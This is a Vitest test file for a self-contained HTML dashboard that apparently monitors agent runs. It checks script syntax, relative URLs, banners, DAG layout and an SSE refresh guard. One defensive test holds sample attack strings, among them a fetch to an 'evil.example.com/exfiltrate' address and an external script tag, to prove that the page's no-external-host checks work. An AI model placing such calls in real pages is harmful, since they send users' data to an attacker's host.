import ts from 'typescript'
import { expect, test } from 'vitest'
import { buildPage } from './page.js'
import { matchRunRoute } from './mission-control-server.js'

test('the page is a complete, self-contained HTML document', () => {
  const html = buildPage()
  expect(html).toMatch(/^<!doctype html>/i)
  expect(html).toContain('<style>')
  expect(html).toContain('<script>')
  expect(html).toContain('</html>')
})

// The inline <script> block is TypeScript source text embedded in a giant
// template literal - `tsc` only ever sees it as a string, so a corrupted
// escape sequence inside it (e.g. \n or \s written with a single backslash,
// which the OUTER template literal itself interprets as an escape before the
// text ever reaches the browser - turning /\n\s*\n/ into a regex containing
// real newline bytes) compiles cleanly and produces a page whose embedded
// script is a hard SyntaxError, silently killing every dynamic feature with
// no compiler or lint signal. ts.transpileModule only parses/transpiles the
// extracted text - it never executes it - so this surfaces the same syntax
// error a browser would hit, without ever running the extracted text as
// code the way a dynamic-code-execution approach would.
test('the inline client script is syntactically valid JavaScript', () => {
  const html = buildPage()
  const match = html.match(/<script>([\s\S]*)<\/script>/)
  expect(match).not.toBeNull()
  const script = match![1]!
  const { diagnostics } = ts.transpileModule(script, { reportDiagnostics: true })
  const messages = (diagnostics ?? []).map((d) => ts.flattenDiagnosticMessageText(d.messageText, '\n'))
  expect(messages).toEqual([])
})

// The back-link is only ever shown when nested under mission control's
// /run/<hash>/<runId>/ route (see the inline script's back.style.display
// logic below), so its relative href must resolve from exactly that depth
// back to mission control's own root - not to the /run/ path one level short
// of it, which matchRunRoute (mission-control-server.ts) 404s on since it
// requires both a hash and a runId segment.
test('the back-link resolves from the nested run route to mission control\'s actual root, not a 404', () => {
  const html = buildPage()
  const match = html.match(/id="back-link" href="([^"]+)"/)
  expect(match).not.toBeNull()
  const href = match![1]!
  const resolved = new URL(href, 'http://localhost/run/somehash/somerunid/').pathname
  expect(resolved).toBe('/')
  expect(matchRunRoute(resolved)).toBeNull()
})

test('nothing in the page reaches out to an external host', () => {
  const html = buildPage()
  // A bare http(s):// substring scan is too broad: it also flags legitimate,
  // never-fetched strings like the SVG XML namespace URI passed to
  // createElementNS. Instead, scope the check to the actual ways a page can
  // reach out to a network host: link/script tags, and fetch/XHR/WebSocket/
  // EventSource calls that target an http(s):// URL (same-origin calls like
  // fetch('/model') or new EventSource('/events') are fine).
  expect(html).not.toMatch(/<link\b/i)          // no external stylesheet/font
  expect(html).not.toMatch(/<script\s+src=/i)   // no external script (only inline <script>)
  expect(html).not.toMatch(/fetch\(\s*['"]https?:/i)
  expect(html).not.toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
  expect(html).not.toMatch(/cdn\./i)
})

test('the self-containment check still catches a real external-URL violation', () => {
  const maliciousSnippet = '<script src="https://evil.example.com/x.js"></script>'
  expect(maliciousSnippet).toMatch(/<script\s+src=/i)

  const maliciousFetch = `fetch('https://evil.example.com/exfiltrate')`
  expect(maliciousFetch).toMatch(/fetch\(\s*['"]https?:/i)

  const maliciousEventSource = `new EventSource('https://evil.example.com/events')`
  expect(maliciousEventSource).toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
})

test('the inline client wires EventSource(\'events\') and fetch(\'model\') as relative URLs', () => {
  // Deliberately relative, not '/events'/'/model': this same page is served
  // both standalone at '/' and nested under mission control's
  // '/run/<hash>/<runId>/' - an absolute path would always hit the site
  // root and 404 under mission control.
  const html = buildPage()
  expect(html).toContain(`new EventSource('events')`)
  expect(html).toContain(`fetch('model')`)
})

// The halted/canceled reason string was previously small dim-gray text
// (#reason) sitting inline next to the run title - easy to miss and
// visually identical for a rail breach vs a deliberate user cancel. It
// must now be a prominent, full-width banner with distinct classes per
// status, hidden entirely outside those two statuses, and must reuse
// model.reason verbatim rather than inventing new wording.
test('the halted/canceled reason renders in a prominent banner, distinctly classed per status, hidden otherwise', () => {
  const html = buildPage()
  expect(html).toContain('id="reason-banner"')
  expect(html).toContain(".reason-banner.reason-halted")
  expect(html).toContain(".reason-banner.reason-canceled")
  // Distinct visible presentation, not just a bare className swap: a
  // border/background/color rule per status, not shared inline dim-gray text.
  const haltedRule = html.match(/\.reason-banner\.reason-halted\s*\{([^}]*)\}/)
  const canceledRule = html.match(/\.reason-banner\.reason-canceled\s*\{([^}]*)\}/)
  expect(haltedRule).not.toBeNull()
  expect(canceledRule).not.toBeNull()
  expect(haltedRule![1]).not.toBe(canceledRule![1])
  // The banner reuses model.reason verbatim - no new copy is authored here.
  expect(html).toContain("document.getElementById('reason').textContent = model.reason")
})

test('the reason banner is only shown for halted/canceled statuses, and hidden for running/verified', () => {
  const html = buildPage()
  const fnMatch = html.match(/function render\(model\) \{[\s\S]*?\n  \}/)
  expect(fnMatch).not.toBeNull()
  const body = fnMatch![0]
  expect(body).toMatch(/model\.status === 'halted'/)
  expect(body).toMatch(/model\.status === 'canceled'/)
  expect(body).toContain("reasonBanner.style.display = 'none'")
})

test('the page renders an empty-state message container for a run with no events yet', () => {
  const html = buildPage()
  expect(html).toContain('id="empty-state"')
})

test('the page defines a live-output section, hidden by default, with a tab strip and output body', () => {
  const html = buildPage()
  expect(html).toContain('id="live-output-section"')
  expect(html).toContain('id="live-tabs"')
  expect(html).toContain('id="live-output-body"')
})

test('the inline client renders live output tabs from the running nodes on every re-render', () => {
  const html = buildPage()
  expect(html).toContain('function renderLiveOutput(model)')
  expect(html).toContain('renderLiveOutput(model)') // called from render(model), not just defined
})

test('the default tab is the first running node, and clicking a tab is wired via addEventListener', () => {
  const html = buildPage()
  expect(html).toContain('selectedTab = running[0].id')
  expect(html).toContain('addEventListener')
})

test('the page has a Calls gauge, wired to totals.calls, distinct from iteration/replans', () => {
  const html = buildPage()
  expect(html).toContain('id="calls-label"')
  expect(html).toContain("document.getElementById('calls-label').textContent = String(model.totals.calls)")
})

test('the resume row includes a wall-minutes input alongside iterations/cost, prefilled from totals.maxWallMinutes and posted on resume', () => {
  const html = buildPage()
  expect(html).toContain('id="resume-wall-minutes"')
  expect(html).toContain('model.totals.maxWallMinutes')
  expect(html).toMatch(/maxWallMinutes:\s*wallMinutes/)
})

// Spend-by-agent's Nodes column previously joined every node id into one
// comma-separated string (g.nodeIds.join(', ')), which the cell's nowrap +
// ellipsis CSS then clipped once an agent backed many nodes. Each id must
// now render as its own child element instead, so nothing is ever hidden
// regardless of how many nodes one agent has.
test('the agent table renders each node id as a distinct element, not one joined string', () => {
  const html = buildPage()
  expect(html).not.toContain("g.nodeIds.join(', ')")
  expect(html).toContain('g.nodeIds.forEach(function (id) { nodeIdsCell.appendChild(htmlEl(\'div\', null, id)) })')
})

// The "this node: N tokens · $X (updates once it finishes)" line duplicated
// info already shown elsewhere (the per-node iteration list / Spend by
// Agent table) once a node finishes, and was misleading while running -
// it should be gone entirely, leaving only the role/agent line (r1).
test('the redundant "this node" tokens/cost line is removed from live-meta', () => {
  const html = buildPage()
  expect(html).not.toContain('this node: ')
  expect(html).not.toContain('updates once it finishes')
  // r1 (role/agent line) must still be present, untouched
  expect(html).toContain("r1.innerHTML = 'role <b>' + current.role + '</b>'")
})

// A single long plan version's <pre> must scroll internally instead of
// expanding the whole page's height without bound.
test('.plan-version pre has a bounded height with its own internal scroll', () => {
  const html = buildPage()
  const match = html.match(/\.plan-version pre\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow-y:\s*auto/)
})

// The DAG's svg viewBox/height already grow unbounded with node count -
// its container (#canvas-wrap) must cap that visually with its own
// max-height + scroll, and render() must auto-tail it the same way
// live-output-body already auto-tails itself.
test('#canvas-wrap caps the DAG height and auto-scrolls to follow new nodes', () => {
  const html = buildPage()
  const match = html.match(/#canvas-wrap\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow:\s*auto/)
  expect(html).toContain("canvasWrap.scrollTop = canvasWrap.scrollHeight")
})

// The svg's markup pins width to "100%"; leaving that attribute
// unoverridden means preserveAspectRatio shrinks the ENTIRE graph to
// stay visible as the viewBox's width grows, rather than ever
// overflowing #canvas-wrap - a linear dependency chain (a self-planning
// splice's mostly one-node-per-layer sequence) grows by x, not y, so this
// left it progressively squished and unreadable instead of scrollable.
// width must be set to the real content width, the same way height
// already is, and BOTH scroll axes must auto-tail - a chain grows by x,
// a bushy fan-out grows by y.
test('the DAG svg width is set to the real content width, not left at "100%", and both scroll axes auto-tail', () => {
  const html = buildPage()
  expect(html).toContain("svg.setAttribute('width', String(Math.max(maxX, 400)))")
  expect(html).toContain('canvasWrap.scrollLeft = canvasWrap.scrollWidth')
})

// Executes the inline script's own htmlEl/renderReport functions (extracted
// verbatim from the built page, not reimplemented) against a minimal fake
// DOM, so this proves actual runtime behavior - not just that certain
// strings appear in the source - for the one property that matters here:
// the expandable files-touched element must exist if and only if
// report.filesTouched has something in it.
function loadRenderReport(): (report: unknown) => void {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const htmlElSrc = script.match(/function htmlEl\(tag, className, text\) \{[\s\S]*?\n  \}\n/)![0]
  const renderReportSrc = script.match(/function renderReport\(report\) \{[\s\S]*?\n  \}\n(?=\n  \/\/|\n  function renderAgentTable)/)![0]
  const factory = new Function('document', `
    ${htmlElSrc}
    ${renderReportSrc}
    return renderReport;
  `)

  function makeFakeElement(tag: string) {
    return {
      tag,
      className: '',
      textContent: '',
      style: {} as Record<string, string>,
      children: [] as unknown[],
      appendChild(child: unknown) { this.children.push(child); return child },
      set innerHTML(_v: string) { this.children = [] },
    }
  }
  const store: Record<string, ReturnType<typeof makeFakeElement>> = {
    'report-head': makeFakeElement('div'),
    'report-panel': makeFakeElement('div'),
    'report-summary': makeFakeElement('div'),
    'report-claims': makeFakeElement('div'),
    'files-touched-container': makeFakeElement('div'),
  }
  const fakeDocument = {
    createElement: (tag: string) => makeFakeElement(tag),
    createTextNode: (text: string) => ({ tag: '#text', textContent: text }),
    getElementById: (id: string) => store[id],
    __store: store,
  }
  const renderReport = factory(fakeDocument) as (report: unknown) => void
  return Object.assign(renderReport, { store })
}

test('renderReport creates the expandable files-touched element only when filesTouched is non-empty', () => {
  const renderReport = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport({ summary: 's', source: 'agent', claims: [], filesTouched: ['a.ts', 'b.ts'] })
  const container = renderReport.store['files-touched-container']
  expect(container.children).toHaveLength(1)
  const details = container.children[0] as { tag: string; children: unknown[] }
  expect(details.tag).toBe('details')
  const summaryEl = details.children[0] as { tag: string; textContent: string }
  expect(summaryEl.tag).toBe('summary')
  expect(summaryEl.textContent).toBe('2 files touched')
  const list = details.children[1] as { tag: string; children: { textContent: string }[] }
  expect(list.tag).toBe('ul')
  expect(list.children.map((li) => li.textContent)).toEqual(['a.ts', 'b.ts'])
})

test('renderReport renders nothing for files-touched when filesTouched is empty or absent', () => {
  const renderReport = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport({ summary: 's', source: 'agent', claims: [], filesTouched: [] })
  expect(renderReport.store['files-touched-container'].children).toHaveLength(0)

  const renderReport2 = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport2({ summary: 's', source: 'agent', claims: [] })
  expect(renderReport2.store['files-touched-container'].children).toHaveLength(0)
})

// Reproduces a real observed bug: on a run whose journal has a lot of
// history (e.g. 1500+ events from a long, self-planning run), /events
// replays the ENTIRE history as one SSE frame per journal event (see
// sse.ts's buildReplay/encodeSseFrame - one frame per event, by design, so
// a client opening the dashboard after the run finished still gets full
// history). Every one of those frames fires the client's `es.onmessage`,
// and until this fix `es.onmessage` called `refresh()` with zero in-flight
// guard - so a single page load against a large journal launched hundreds
// of overlapping `fetch('model')` calls back-to-back, which is exactly what
// produced the reported `net::ERR_INSUFFICIENT_RESOURCES` storm (browsers
// cap pending same-origin requests). This executes the extracted, real
// `refresh()` source (not a reimplementation) against a stubbed fetch and
// proves it never has more than one `fetch('model')` in flight at a time,
// no matter how many times onmessage-equivalent calls arrive back-to-back.
function loadRefresh(): {
  refresh: () => Promise<void>
  getFetchCallCount: () => number
  getPeakConcurrentFetches: () => number
  resolveAllPendingFetches: () => Promise<void>
} {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const refreshSrc = script.match(/var refreshInFlight[\s\S]*?function refresh\(\) \{[\s\S]*?\n  \}\n/)![0]

  let fetchCallCount = 0
  let inFlight = 0
  let peakConcurrent = 0
  const pendingResolvers: Array<() => void> = []
  const fakeFetch = () => {
    fetchCallCount++
    inFlight++
    peakConcurrent = Math.max(peakConcurrent, inFlight)
    return new Promise((resolve) => {
      pendingResolvers.push(() => {
        inFlight--
        resolve({ json: () => Promise.resolve({}) })
      })
    })
  }
  const fakeRender = () => {}

  const factory = new Function('fetch', 'render', `
    ${refreshSrc}
    return refresh;
  `)
  const refresh = factory(fakeFetch, fakeRender) as () => Promise<void>

  return {
    refresh,
    getFetchCallCount: () => fetchCallCount,
    getPeakConcurrentFetches: () => peakConcurrent,
    resolveAllPendingFetches: async () => {
      while (pendingResolvers.length > 0) pendingResolvers.pop()!()
      await Promise.resolve()
      await Promise.resolve()
    },
  }
}

test('refresh() never has more than one fetch(\'model\') in flight, even when called back-to-back many times (SSE replay storm)', async () => {
  const { refresh, getPeakConcurrentFetches, resolveAllPendingFetches } = loadRefresh()

  // Simulate a large journal's replay: many SSE messages arriving and
  // firing es.onmessage -> refresh() back-to-back before the first
  // fetch('model') has resolved - exactly what a 1500+-event journal
  // replay does on initial connect.
  for (let i = 0; i < 50; i++) refresh()
  await resolveAllPendingFetches()

  expect(getPeakConcurrentFetches()).toBeLessThanOrEqual(1)
})
